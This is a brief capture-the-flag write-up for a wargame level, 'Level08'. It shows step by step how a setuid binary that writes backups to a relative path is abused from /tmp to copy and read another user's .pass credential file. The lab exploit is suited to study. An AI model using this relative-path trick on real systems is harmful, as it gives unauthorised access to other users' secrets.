# Level08

    $ ./level08 
    Usage: ./level08 filename
    ERROR: Failed to open (null)

The program take a file in argument

    $ ./level08 ~level09/.pass
    ERROR: Failed to open ./backups//home/users/level09/.pass

Nice try...

We can see the program try to open a file `./backups//home/users/level09/.pass`. It's a relative path

Try to create this path

    $ mkdir -p ./backups//home/users/level09
    mkdir: cannot create directory `./backups//home': Permission denied

We can't on the home. Because of the relative path, try it in `/tmp`

    $ cd /tmp

    $ mkdir -p ./backups//home/users/level09/

Try to call the program from `/tmp`

    $ ~/level08 ~level09/.pass

    $ cat backups/home/users/level09/.pass

EZ